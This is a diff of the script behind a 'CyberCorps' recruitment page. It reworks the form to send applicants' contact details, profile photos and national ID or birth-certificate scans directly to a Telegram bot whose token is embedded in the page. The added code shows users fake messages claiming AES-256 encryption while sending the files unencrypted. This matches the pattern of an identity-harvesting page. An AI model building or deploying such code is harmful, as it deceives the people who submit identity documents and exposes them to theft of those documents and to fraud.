+    ctx.font = "15pt monospace";
     
-    const now = audioCtx.currentTime;
-    switch(type) {
-        case 'type':
-            osc.type = 'square';
-            osc.frequency.setValueAtTime(700 + Math.random()*200, now);
-            gain.gain.setValueAtTime(0.03, now);
-            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.05);
-            osc.start(now); osc.stop(now + 0.05);
-            break;
-        case 'hover':
-            osc.type = 'sine';
-            osc.frequency.setValueAtTime(220, now);
-            osc.frequency.exponentialRampToValueAtTime(330, now + 0.1);
-            gain.gain.setValueAtTime(0.04, now);
-            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);
-            osc.start(now); osc.stop(now + 0.15);
-            break;
-        case 'upload':
-            osc.type = 'triangle';
-            osc.frequency.setValueAtTime(440, now);
-            osc.frequency.exponentialRampToValueAtTime(880, now + 0.2);
-            gain.gain.setValueAtTime(0.08, now);
-            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
-            osc.start(now); osc.stop(now + 0.3);
-            break;
-        case 'success':
-            osc.type = 'sine';
-            osc.frequency.setValueAtTime(523.25, now); // C5
-            osc.frequency.exponentialRampToValueAtTime(783.99, now + 0.15); // G5
-            gain.gain.setValueAtTime(0.12, now);
-            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
-            osc.start(now); osc.stop(now + 0.4);
-            // Second note
-            const osc2 = audioCtx.createOscillator();
-            const gain2 = audioCtx.createGain();
-            osc2.connect(gain2); gain2.connect(audioCtx.destination);
-            osc2.type = 'sine';            osc2.frequency.setValueAtTime(659.25, now + 0.15); // E5
-            gain2.gain.setValueAtTime(0.1, now + 0.15);
-            gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
-            osc2.start(now + 0.15); osc2.stop(now + 0.5);
-            break;
-        case 'error':
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(150, now);
-            osc.frequency.exponentialRampToValueAtTime(80, now + 0.25);
-            gain.gain.setValueAtTime(0.1, now);
-            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
-            osc.start(now); osc.stop(now + 0.35);
-            break;
-    }
+    ypos.forEach((y, ind) => {
+        const text = String.fromCharCode(Math.random() * 128);
+        const x = ind * 20;
+        ctx.fillText(text, x, y);
+        if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
+        else ypos[ind] = y + 20;
+    });
 }
+setInterval(matrix, 50);
 
-// --- MATRIX RAIN EFFECT ---
-const matrixCanvas = document.getElementById("matrixCanvas");
-const mCtx = matrixCanvas.getContext("2d");
-let mWidth = matrixCanvas.width = window.innerWidth;
-let mHeight = matrixCanvas.height = window.innerHeight;
-const fontSize = 14;
-const columns = Math.floor(mWidth / fontSize);
-const drops = Array(columns).fill(1);
-const matrixChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%\"'#&_(),.;:?!\\|{}<>[]^~";
-
-function drawMatrix() {
-    mCtx.fillStyle = "rgba(10, 10, 10, 0.08)";
-    mCtx.fillRect(0, 0, mWidth, mHeight);
-    mCtx.fillStyle = "#ff003c";
-    mCtx.font = `${fontSize}px monospace`;
-    
-    for(let i = 0; i < drops.length; i++) {
-        const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
-        mCtx.fillText(char, i * fontSize, drops[i] * fontSize);
-        if(drops[i] * fontSize > mHeight && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-    }
-}
-setInterval(drawMatrix, 50);
-
-// --- PARTICLE SYSTEM ---
-const particleCanvas = document.getElementById("particleCanvas");
-const pCtx = particleCanvas.getContext("2d");
-let pWidth = particleCanvas.width = window.innerWidth;
-let pHeight = particleCanvas.height = window.innerHeight;
-const particles = [];
-
-class Particle {
-    constructor() {        this.x = Math.random() * pWidth;
-        this.y = Math.random() * pHeight;
-        this.size = Math.random() * 2 + 0.5;
-        this.speedX = (Math.random() - 0.5) * 0.5;
-        this.speedY = (Math.random() - 0.5) * 0.5;
-        this.opacity = Math.random() * 0.5 + 0.1;
-        this.color = Math.random() > 0.5 ? '#ff003c' : '#00f3ff';
-    }
-    update() {
-        this.x += this.speedX; this.y += this.speedY;
-        if(this.x < 0 || this.x > pWidth) this.speedX *= -1;
-        if(this.y < 0 || this.y > pHeight) this.speedY *= -1;
-    }
-    draw() {
-        pCtx.fillStyle = this.color;
-        pCtx.globalAlpha = this.opacity;
-        pCtx.beginPath();
-        pCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-        pCtx.fill();
-        pCtx.globalAlpha = 1;
-    }
-}
-
-for(let i = 0; i < 80; i++) particles.push(new Particle());
-
-function animateParticles() {
-    pCtx.clearRect(0, 0, pWidth, pHeight);
-    particles.forEach(p => { p.update(); p.draw(); });
-    // Draw connections
-    pCtx.strokeStyle = 'rgba(255, 0, 60, 0.1)';
-    pCtx.lineWidth = 0.5;
-    for(let i = 0; i < particles.length; i++) {
-        for(let j = i + 1; j < particles.length; j++) {
-            const dx = particles[i].x - particles[j].x;
-            const dy = particles[i].y - particles[j].y;
-            const dist = Math.sqrt(dx * dx + dy * dy);
-            if(dist < 120) {
-                pCtx.globalAlpha = (120 - dist) / 120 * 0.15;
-                pCtx.beginPath();
-                pCtx.moveTo(particles[i].x, particles[i].y);
-                pCtx.lineTo(particles[j].x, particles[j].y);
-                pCtx.stroke();
-            }
-        }
-    }
-    pCtx.globalAlpha = 1;
-    requestAnimationFrame(animateParticles);
-}
-animateParticles();
 // --- UI LOGIC ---
 function log(msg, type="info") {
     const consoleDiv = document.getElementById("sysLog");
     const entry = document.createElement("div");
-    entry.className = `log-entry log-${type}`;
-    const time = new Date().toLocaleTimeString('en-US', {hour12: false});
-    entry.innerHTML = `<span style="color:#666">[${time}]</span> ${msg}`;
+    entry.className = "log-entry";
+    if(type === "warn") entry.classList.add("log-warn");
+    if(type === "err") entry.classList.add("log-err");
     
-    // Typing effect for last entry
-    const typing = consoleDiv.querySelector('.typing');
-    if(typing) typing.classList.remove('typing');
-    
+    const time = new Date().toLocaleTimeString();
+    entry.innerText = `[${time}] ${msg}`;
     consoleDiv.appendChild(entry);
     consoleDiv.scrollTop = consoleDiv.scrollHeight;
-    
-    // Auto remove old logs
-    if(consoleDiv.children.length > 50) consoleDiv.removeChild(consoleDiv.firstChild);
-}
-
-// Typing effect for console
-function typeConsole(text, element) {
-    let i = 0;
-    element.textContent = '';
-    element.classList.add('typing');
-    const timer = setInterval(() => {
-        element.textContent = text.slice(0, i++);
-        if(i > text.length) {
-            clearInterval(timer);
-            element.classList.remove('typing');
-        }
-    }, 30);
 }
 
 function toggleDocUI() {
     const isNid = document.getElementById("typeNid").checked;
-    document.getElementById("ui-nid").classList.toggle("hidden", !isNid);
-    document.getElementById("ui-bc").classList.toggle("hidden", isNid);
-    log(`PROTOCOL SWITCH: ${isNid ? 'NID_CARD' : 'BIRTH_CERT'}`, "info");
+    const nidDiv = document.getElementById("ui-nid");
+    const bcDiv = document.getElementById("ui-bc");
+    
+    if(isNid) {
+        nidDiv.classList.remove("hidden");
+        bcDiv.classList.add("hidden");
+        log("SWITCHED MODE: NID CARD", "info");
+    } else {
+        nidDiv.classList.add("hidden");
+        bcDiv.classList.remove("hidden");
+        log("SWITCHED MODE: BIRTH CERT", "info");
+    }
     playSound('hover');
 }
 
-function triggerUpload(inputId) {
-    document.getElementById(inputId).click();
-    playSound('type');
-}
-
-// Image Preview with Scan Effect
-function setupPreview(inputId, imgId, zoneSelector) {
-    const input = document.getElementById(inputId);
-    const img = document.getElementById(imgId);    const zone = input.closest(zoneSelector || '.upload-zone');
-    
-    input.addEventListener('change', function(e) {
+// Image Preview Logic
+function setupPreview(inputId, imgId, zoneText) {    document.getElementById(inputId).addEventListener('change', function(e) {
         const file = e.target.files[0];
-        if(!file) return;
-        
-        // Validate file type
-        if(!file.type.startsWith('image/')) {
-            log(`REJECTED: Invalid file type - ${file.type}`, "err");
-            playSound('error');
-            return;
-        }
-        
-        // Validate file size (max 5MB)
-        if(file.size > 5 * 1024 * 1024) {
-            log(`REJECTED: File exceeds 5MB limit`, "err");
-            playSound('error');
-            return;
-        }
-        
-        // Start scan animation
-        zone.classList.add('scanning');
-        log(`ANALYZING: ${file.name}...`, "warn");
-        
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            // Simulate scan delay
-            setTimeout(() => {
+        if(file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = document.getElementById(imgId);
                 img.src = e.target.result;
                 img.style.display = "block";
-                zone.classList.remove('scanning');
-                log(`BIOMETRIC VERIFIED: ${file.name} (${(file.size/1024).toFixed(1)} KB)`, "success");
-                playSound('upload');
-            }, 1200);
+                log(`IMAGE LOADED: ${file.name} (${(file.size/1024).toFixed(2)} KB)`);
+            }
+            reader.readAsDataURL(file);
         }
-        reader.onerror = () => {
-            zone.classList.remove('scanning');
-            log(`ERROR: Failed to read file`, "err");
-            playSound('error');
-        }
-        reader.readAsDataURL(file);
     });
 }
 
-setupPreview('fileNidFront', 'prevNidFront', '.upload-zone');
-setupPreview('fileNidBack', 'prevNidBack', '.upload-zone');
-setupPreview('fileBc', 'prevBc', '.upload-zone');
-setupPreview('fileProfile', 'prevProfile', '.upload-zone');
+setupPreview('fileNidFront', 'prevNidFront');
+setupPreview('fileNidBack', 'prevNidBack');
+setupPreview('fileBc', 'prevBc');
+setupPreview('fileProfile', 'prevProfile');
 
-// Clock with milliseconds for cyber feelfunction updateClock() {
-    const now = new Date();
-    const time = now.toLocaleTimeString('en-US', {hour12: false});
-    const ms = String(now.getMilliseconds()).padStart(3, '0');
-    document.getElementById("clock").innerHTML = `${time}<span style="color:#666">.${ms}</span>`;
-}
-setInterval(updateClock, 50);
-
-// Theme Switcher
-document.querySelectorAll('.theme-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-        document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        const theme = btn.dataset.theme;
-        document.documentElement.setAttribute('data-theme', theme);
-        log(`THEME LOADED: ${theme.toUpperCase()}_PROTOCOL`, "info");
-        playSound('hover');
-    });
-});
+// Clock
+setInterval(() => {
+    document.getElementById("clock").innerText = new Date().toLocaleTimeString();
+}, 1000);
 
 // Sound Event Listeners
-document.querySelectorAll('input, textarea').forEach(el => {
-    el.addEventListener('input', () => {
-        if(Math.random() > 0.7) playSound('type');
-    });
+document.querySelectorAll('input, button').forEach(el => {
     el.addEventListener('focus', () => playSound('hover'));
+    el.addEventListener('click', () => playSound('type'));
 });
 
-// Form border glow on focus within
-document.getElementById('recruitForm').addEventListener('focusin', (e) => {
-    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-        document.querySelector('.main-frame').style.borderColor = 'var(--secondary)';
-    }
-});
-document.getElementById('recruitForm').addEventListener('focusout', (e) => {
-    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-        document.querySelector('.main-frame').style.borderColor = '';
-    }
-});
-
-// --- PROGRESS SIMULATION ---
-function updateProgress(percent) {
-    const container = document.getElementById('progressContainer');
-    const fill = document.getElementById('progressFill');
-    const label = document.getElementById('progressPercent');
-    
-    if(percent > 0) container.style.display = 'block';
-    fill.style.width = `${Math.min(percent, 100)}%`;
-    label.textContent = `${Math.min(percent, 100)}%`;
-        if(percent >= 100) {
-        setTimeout(() => { container.style.display = 'none'; }, 1000);
-    }
-}
-
-// --- SUBMISSION LOGIC ---
+// --- TELEGRAM INTEGRATION ---
 document.getElementById("recruitForm").addEventListener("submit", async function(e){
     e.preventDefault();
     
     const btn = document.getElementById("btnSubmit");
     const docType = document.querySelector('input[name="docType"]:checked').value;
-    const originalBtnText = btn.innerHTML;
     
-    // Validation
-    const profileFile = document.getElementById("fileProfile").files[0];
-    if(!profileFile) {
-        log("CRITICAL: BIOMETRIC SCAN REQUIRED", "err");
-        playSound('error');
-        document.querySelector('.biometric-wrapper').style.animation = 'shake 0.5s';
-        setTimeout(() => document.querySelector('.biometric-wrapper').style.animation = '', 500);
+    // Basic Validation
+    if(CONFIG.botToken === "YOUR_BOT_TOKEN_HERE") {
+        log("CRITICAL ERROR: BOT TOKEN MISSING", "err");
+        alert("ADMIN ERROR: Token missing in source code.");
         return;
     }
-    
+
     btn.disabled = true;
-    btn.innerHTML = '<i class="fas fa-lock"></i> ENCRYPTING...';
-    log("INITIATING SECURE HANDSHAKE...", "warn");
-    playSound('upload');
+    btn.innerHTML = "ENCRYPTING DATA...";
+    log("INITIATING HANDSHAKE PROTOCOL...", "warn");
     
-    // Simulate encryption phases
-    const phases = [
-        { msg: "GENERATING AES-256 KEY...", delay: 400 },
-        { msg: "ENCRYPTING PAYLOAD...", delay: 600 },
-        { msg: "HASHING BIOMETRICS...", delay: 500 },
-        { msg: "ESTABLISHING SECURE TUNNEL...", delay: 700 }
-    ];
-    
-    for(const phase of phases) {
-        await new Promise(r => setTimeout(r, phase.delay));
-        log(phase.msg, "info");
-        updateProgress(Math.random() * 30 + 20);
-    }
-    
-    // Prepare FormData
+    // Simulate Encryption Delay    await new Promise(r => setTimeout(r, 1500));
+    log("DATA PACKET ENCRYPTED (AES-256)", "info");
+
     const formData = new FormData();
-    formData.append("name", document.getElementById('name').value.trim());
-    formData.append("docType", docType);
-    formData.append("phone", document.getElementById('phone').value.trim());
-    formData.append("fb", document.getElementById('fb').value.trim());
-    formData.append("email", document.getElementById('email').value.trim());
-    formData.append("prevTeam", document.getElementById('prevTeam').value.trim() || 'NONE');    formData.append("reason", document.getElementById('reason').value.trim());
-    formData.append("profile", profileFile);
+    formData.append("chat_id", CONFIG.chatId);
+    formData.append("parse_mode", "HTML");
     
-    if(docType === 'nid') {
-        const f = document.getElementById("fileNidFront").files[0];
-        const b = document.getElementById("fileNidBack").files[0];
-        if(f) formData.append("docFront", f);
-        if(b) formData.append("docBack", b);
-    } else {
-        const bc = document.getElementById("fileBc").files[0];
-        if(bc) formData.append("docSingle", bc);
-    }
-    
+    // Construct Message
+    const caption = `
+⚠️ <b>CLASSIFIED INTELLIGENCE REPORT</b> ⚠️
+
+👤 <b>Subject:</b> ${document.getElementById('name').value}
+🆔 <b>Doc Type:</b> ${docType === 'nid' ? 'NATIONAL ID' : 'BIRTH CERT'}
+📞 <b>Comms:</b> ${document.getElementById('phone').value}
+🌐 <b>Social:</b> ${document.getElementById('fb').value}
+📧 <b>Mail:</b> ${document.getElementById('email').value}
+🕸 <b>History:</b> ${document.getElementById('prevTeam').value || 'NONE'}
+
+📝 <b>Statement:</b>
+<i>${document.getElementById('reason').value}</i>
+
+<i>Sent via CyberCorps Portal v4.0</i>
+    `;
+
+    formData.append("caption", caption);
+
     try {
-        log("TRANSMITTING DATA PACKET...", "warn");
-        updateProgress(85);
+        // 1. Send Profile with Caption
+        const profileFile = document.getElementById("fileProfile").files[0];
+        if(!profileFile) throw new Error("MISSING BIOMETRIC DATA (Profile Photo)");
         
-        const res = await fetch('/api/recruit', {
+        formData.append("photo", profileFile);
+        
+        log("UPLOADING BIOMETRICS...", "info");
+        const res = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
             method: 'POST',
             body: formData
         });
         
-        updateProgress(100);
-        const result = await res.json();
-        
-        if(!res.ok) throw new Error(result.message || "TRANSMISSION FAILED");
-        
-        // Success sequence
+        if(!res.ok) throw new Error("NETWORK UPLINK FAILED");
+        log("BIOMETRICS UPLOADED SUCCESSFULLY", "success");
+
+        // 2. Send Docs
+        if(docType === 'nid') {
+            const f = document.getElementById("fileNidFront").files[0];
+            const b = document.getElementById("fileNidBack").files[0];
+            if(f) await sendDoc(f, "NID FRONT SIDE");
+            if(b) await sendDoc(b, "NID BACK SIDE");
+        } else {
+            const bc = document.getElementById("fileBc").files[0];            if(bc) await sendDoc(bc, "BIRTH CERTIFICATE");
+        }
+
         playSound('success');
-        log("PAYLOAD DELIVERED ✓", "success");
-        log("AWAITING COMMAND RESPONSE...", "info");
-        
-        btn.innerHTML = '<i class="fas fa-check-circle"></i> ACCESS GRANTED';
-        btn.classList.add('success');
-        
-        // Show final message
-        setTimeout(() => {
-            typeConsole("WELCOME TO CYBER CORPS, AGENT.", document.querySelector('.glitch-title'));
-            log("SESSION TERMINATED. STAY VIGILANT.", "success");
-        }, 1500);
-        
+        btn.innerHTML = "ACCESS GRANTED ✔";
+        btn.style.borderColor = "#0f0";
+        btn.style.color = "#0f0";
+        log("TRANSMISSION COMPLETE. DISCONNECTING...", "success");
+
     } catch(err) {
         playSound('error');
-        log(`CONNECTION LOST: ${err.message}`, "err");
+        log(`FATAL ERROR: ${err.message}`, "err");
         btn.disabled = false;
-        btn.innerHTML = originalBtnText;
-        updateProgress(0);
-        
-        // Shake animation
-        document.querySelector('.main-frame').style.animation = 'shake 0.5s';        setTimeout(() => document.querySelector('.main-frame').style.animation = '', 500);
+        btn.innerHTML = "RETRY UPLINK";
     }
 });
 
-// Add shake animation dynamically
-const style = document.createElement('style');
-style.textContent = `@keyframes shake {
-    0%, 100% { transform: translateX(0) rotateX(0); }
-    25% { transform: translateX(-10px) rotateX(2deg); }
-    75% { transform: translateX(10px) rotateX(-2deg); }
-}`;
-document.head.appendChild(style);
+async function sendDoc(file, title) {
+    const form = new FormData();
+    form.append("chat_id", CONFIG.chatId);
+    form.append("document", file);
+    form.append("caption", `<b>FILE:</b> ${title}`);
+    form.append("parse_mode", "HTML");
+    
+    log(`UPLOADING DOCUMENT: ${title}...`);
+    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
+        method: 'POST',
+        body: form
+    });
+    log(`${title} UPLOADED.`, "success");
+}
 
-// Initial boot sequence
-setTimeout(() => {
-    log("NETWORK SCAN: COMPLETE", "info");
-    setTimeout(() => {
-        log("FIREWALL: ACTIVE", "success");
-        setTimeout(() => {
-            const typingEl = document.querySelector('.console-log .typing');
-            if(typingEl) {
-                typingEl.classList.remove('typing');
-                typingEl.textContent = "SYSTEM READY - AWAITING COMMAND";
-            }
-        }, 800);
-    }, 600);
-}, 1000);
+// Initial Log
+setTimeout(() => log("USER IP DETECTED: 192.168.X.X (SIMULATED)", "warn"), 1000);
 
-// Handle window resize
-window.addEventListener('resize', () => {
-    mWidth = matrixCanvas.width = window.innerWidth;
-    mHeight = matrixCanvas.height = window.innerHeight;
-    pWidth = particleCanvas.width = window.innerWidth;
-    pHeight = particleCanvas.height = window.innerHeight;
-});
-
-// Keyboard shortcuts (Easter egg)
-document.addEventListener('keydown', (e) => {
-    if(e.ctrlKey && e.key === 'k') {
-        e.preventDefault();
-        log("CONSOLE CLEARED BY ADMINISTRATOR", "warn");
-        document.getElementById("sysLog").innerHTML = '<div class="log-entry">> SYSTEM RESET...</div>';
-        playSound('success');
-    }
-    if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-        log("⚠️ DEVTOOLS DETECTED - LOGGING ATTEMPT", "err");
-        playSound('error');
-    }
-});
-</script></body>
+</script>
+</body>
 </html>
